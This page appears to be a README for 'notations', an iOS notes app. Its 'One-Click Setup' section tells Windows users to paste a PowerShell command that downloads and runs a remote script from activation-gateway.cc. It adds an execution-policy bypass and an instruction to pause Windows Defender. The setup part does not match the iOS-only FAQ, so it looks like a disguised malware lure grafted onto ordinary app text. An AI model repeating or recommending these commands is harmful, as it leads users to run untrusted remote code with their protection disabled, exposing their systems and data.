## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Start PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Paste and run
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## FAQ

**Where are my notes stored?**
Everything lives right on your device inside notations. Your notes stay put between launches, so you can close the app and pick up exactly where you left off.

**Can I sync my notes across devices?**
notations is built around a single-device, local-first experience. There is no account to create and no cloud sync to configure — just open the app and start writing.

**How do I create a new note?**
Tap the compose button and start typing. That's it. A fresh note appears immediately, ready for whatever you need to remember. Check the Screenshots section above for a look at the empty-note flow.

**How do I edit or delete a note?**
Tap any note to open it for editing, and swipe to remove notes you no longer need. Changes save automatically as you type, so there's no save button to hunt for.

**Does notations work offline?**
Yes — completely. Since your notes are stored locally, you can write and edit with no connection at all.

**Is there a dark mode?**
notations follows your system appearance setting, so it matches the rest of your device automatically.

**Does it support iPad or other platforms?**
notations is designed specifically for iOS. The layout and interactions are tuned for iPhone, as shown throughout the Screenshots section.

**I found a bug or have a feature idea. Where do I share it?**
Head to the project's issue tracker and open a new issue describing what you ran into or what you'd like to see. Screenshots and steps to reproduce help a lot.

**Can I contribute to notations?**
Absolutely. The project welcomes contributions — check the repository's contributing guidelines and open issues to find a good starting point.

**Is notations free?**
Yes, notations is open source and free to use. See the License section for the details on how it can be used and shared.
